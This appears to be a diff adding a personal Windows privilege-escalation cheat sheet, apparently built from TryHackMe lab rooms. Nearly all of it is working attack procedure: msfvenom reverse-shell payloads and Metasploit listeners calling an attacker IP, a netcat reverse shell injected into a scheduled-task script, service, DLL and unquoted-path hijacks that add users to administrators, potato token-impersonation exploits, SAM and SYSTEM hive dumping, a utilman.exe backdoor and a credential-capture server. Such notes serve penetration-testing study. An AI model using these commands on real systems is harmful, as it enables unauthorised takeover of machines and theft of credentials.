@@ -1,0 +1,262 @@
+### win privesc ###
+## LINKS
+https://tryhackme.com/room/windowsprivescarena
+https://tryhackme.com/room/windows10privesc
+https://tryhackme.com/room/windowsprivesc20
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
+
+
+
+## ENUMS
+# winPEASany.exe	https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
+# PrivescCheck		https://github.com/itm4n/PrivescCheck
+PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
+PS C:\> . .\PrivescCheck.ps1
+PS C:\> Invoke-PrivescCheck
+# WES-NG		https://github.com/bitsadmin/wesng
+On attacker machine
+wes.py --update
+wes.py systeminfo.txt	# after getting output of systeminfo from target
+# Seatbelt.exe
+https://github.com/GhostPack/Seatbelt
+# PowerUp.ps1
+# SharpUp.exe
+
+
+
+## COPY FILES
+1) mount with rdp
+2) smb share
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .
+> copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
+
+
+
+## KERNEL EXPLOIT
+After having a meterpreter 
+> run post/multi/recon/local_exploit_suggester
+
+
+
+## AUTORUN
+> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run			# check AutoRun executables
+> C:\Tools\Autoruns\Autoruns64.exe						# check autorun "logon"
+> C:\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"	# check perms
+> C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+# check if "everyone" may have "FILE_ALL_ACCESS"
+
+# on attacker machine
+msfconsole
+> use multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set lhost 10.8.98.114
+> run
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.98.114 -f exe -o program.exe
+# copy program in C:\Program Files\Autorun Program and wait admin to log back
+copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
+
+
+
+## ALWAYS ELEVATED INSTALL
+# [+] 10.10.139.34 - exploit/windows/local/always_install_elevated: The target is vulnerable.	# on metasploit
+# on pwned machine
+> reg query HKLM\Software\Policies\Microsoft\Windows\Installer			# check if value is 1
+> reg query HKCU\Software\Policies\Microsoft\Windows\Installer			# check if value is 1
+
+# on attacker machine
+msfconsole
+> use multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set lhost 10.8.98.114
+> run
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.98.114 -f msi -o setup.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.98.114 LPORT=4444 -f msi -o reverse.msi
+
+# copy setup.msi to pwned machine
+> msiexec /quiet /qn /i C:\Temp\setup.msi
+
+
+
+## SCHEDULED TASKS
+# list scheduled tasks
+> schtasks									# list all tasks
+> schtasks | findstr /v Disabled						# exclude disabled tasks
+> schtasks /query /tn TASKNAME /fo list /v					# get some info on a task
+# find a scheduled tasks and check its right from your user
+> icacls c:\tasks\schtask.bat							# check rights
+> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat	# add reverse shell
+> schtasks /run /tn vulntask							# start task if you have perm
+# other example
+> C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1	# check rights
+> echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1			# add our reverse shell
+
+
+
+## INSECURE GUI APPS
+# launch some GUI apps and checks theirs rights
+> tasklist /V | findstr mspaint.exe						# example with paint in admin
+# then try to open file then in navigation input file://c:/windows/system32/cmd.exe
+
+
+
+## SERVICE REGISTRY
+# Check if user belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key
+P> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+OR
+> sc qc regsvc									# check who launch the service
+> C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+
+# on attacker machine
+cp /home/tristan/perso/secu/static/windows/tools/Source/windows_service.c ./
+# update system(), example: "cmd.exe /k net localgroup administrators user /add"
+x86_64-w64-mingw32-gcc windows_service.c -o service.exe
+# OR basic reverse shell msfvenom -p windows/x64/shell_reverse_tcp
+
+> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\service.exe /f
+> sc start regsvc								# start the service
+OR > net start regsvc								# start the service
+
+
+
+## SERVICE EXECUTABLE
+> C:\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
+> C:\PrivEsc\accesschk.exe -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+> icacls C:\PROGRA~2\SYSTEM~1\WService.exe					# or with icacls
+> icacls WService.exe /grant Everyone:F						# after cp your rshell
+# Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe
+> sc qc SRVNAME									# check who launch the service
+
+# service.exe, cf: SERVICE REGISTRY
+> copy /y c:\Temp\service.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
+> sc start filepermsvc								# start the service
+OR > net start filepermsvc							# start the service
+> net localgroup administrators							# check if user was added to admin
+										# or check your reverse shell
+
+
+
+## STARTUP APPLICATIONS
+> icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+OR > C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+# From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory
+
+# on attacker machine
+msfconsole
+> use multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set lhost 10.8.98.114
+> run
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.98.114 -f exe -o meterpreter.exe
+# placed meterpreter.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”
+# wait admin to log back
+
+
+
+## SERVICE DLL HIJACKING
+# on pwned machine
+Try to find a service with try to execute a dll in a writable location
+
+# on attacker machine
+cp /home/tristan/perso/secu/static/windows/tools/Source/windows_dll.c ./
+
+# update system(), example: "cmd.exe /k net localgroup administrators user /add"
+x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
+
+# on pwned machine
+Place hijackme.dll in ‘C:\Temp’.
+> sc stop dllsvc & sc start dllsvc
+
+
+
+## SERVICE BINPATH
+> C:\PrivEsc\Tools\Accesschk\accesschk64.exe -wuvc daclsvc		# check right on daclsvc service
+# Notice is the output sugest that your user or everyone has the “SERVICE_CHANGE_CONFIG” permission.
+
+> sc qc daclsvc								# check the start name if it is system
+> sc config daclsvc binpath= "net localgroup administrators user /add"
+OR > sc config daclsvc binpath= "\"C/\PrivEsc\reverse.exe\""		# lunch a reverse chell or meterpreter
+OR > sc config daclsvc binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj=LocalSystem	# highest priv
+
+> sc start daclsvc							# start the service
+OR > net start daclsvc							# start the service
+> net localgroup administrators						# check if you are now admin
+									# or check your reverse shell
+
+
+## FIND UNQUOTED SERVICE PATHS
+> sc qc unquotedsvc							# unquotedsvc example
+# check if BINARY_PATH_NAME is unquoted
+# example: C:\Program Files\Unquoted Path Service\Common Files\unquotedsvcprogram.exe
+
+> C:\PrivEsc\Tools\Accesschk\accesschk64.exe -wudq "C:\Program Files\Unquoted Path Service\"
+> C:\PrivEsc\accesschk.exe /accepteula -wudq "C:\Program Files\Unquoted Path Service\"
+# Check if BUILTIN\Users group is allowed to write in the folder
+
+# on attacker machine
+msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
+
+# place common.exe in C:\Program Files\Unquoted Path Service\
+> icacls C:\MyPrograms\Disk.exe /grant Everyone:F			# grant rights if needed
+> sc start unquotedsvc							# start the service
+OR > net start unquotedsvc						# start the service
+> net localgroup administrators                                         # check if you are now admin
+									# or check your reverse shell
+
+
+
+## TOKEN Impersonation - rogue potato
+# Set up a socat redirector, forwarding attacker port 135 to port 9999 on Windows
+sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.56.216:9999		# your port 135 to target:9999
+# start listener with msf set payload windows/x64/shell_reverse_tcp
+# with a "nt authority\local service" reverse shell, launch potato
+msf shell> C:\PrivEsc\RoguePotato.exe -r 10.8.98.114 -e "C:\PrivEsc\reverse.exe" -l 9999
+
+
+
+## TOKEN Impersonation - PrintSpoofer
+# with a "nt authority\local service" reverse shell
+msf shell> C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i	# PrintSpoofer exploit
+
+
+
+## HOT POTATO
+> powershell.exe -nop -ep bypass
+> Import-Module \\tsclient\share\Tools\Tater\Tater.ps1
+> Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
+> net localgroup administrators						# check if you are now admin
+
+
+
+## SEBACKUP / SERESTORE
+# if you are admin but not all admin right
+> whoami /priv								# check SeBackupPrivilege/SeRestorePrivilege
+> reg save hklm\system C:\Users\THMBackup\system.hive
+> reg save hklm\sam C:\Users\THMBackup\sam.hive
+
+
+
+## SETAKEOWNERSHIP
+# if you are admin but not all admin right
+> whoami /priv								# check SeTakeOwnershipPrivilege
+> takeown /f C:\Windows\System32\Utilman.exe				# change owner
+> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F	# change right
+C:\Windows\System32\> copy cmd.exe utilman.exe				# change utilman by cmd
+# then lock account and clic on "ease of access" (aka utilman)
+
+
+
+## STEAL PASSWORD
+# on attacker
+msfconsole
+use auxiliary/server/capture/http_basic
+set uripath x
+set SRVPORT 8080
+run
+# on pwned machine
+http://10.8.98.114:8080/x
+
+
